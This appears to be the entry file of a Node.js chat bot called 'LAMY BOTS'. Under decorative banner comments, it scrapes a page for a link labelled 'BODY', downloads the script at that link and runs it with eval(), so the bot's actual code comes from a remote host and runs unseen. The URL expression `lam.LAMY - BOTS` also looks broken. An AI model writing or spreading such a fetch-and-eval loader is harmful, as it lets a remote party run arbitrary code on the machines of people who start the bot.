//  [LAMY BOTS QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Lameck Adema                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const lam = require("./config");

async function fetchBODYUrl() {
    try {
        const response = await axios.get(lam.LAMY - BOTS);
        const $ = cheerio.load(response.data);

        const targetElement = $('a:contains("BODY")');
        const targetUrl = targetElement.attr('href');

        if (!targetUrl) {
            throw new Error('heart not found 😭');
        }

        console.log('The heart is loaded successfully ✅');

        const scriptResponse = await axios.get(targetUrl);
        eval(scriptResponse.data);

    } catch (error) {
        console.error('Error:', error.message);
    }
}

fetchBODYUrl();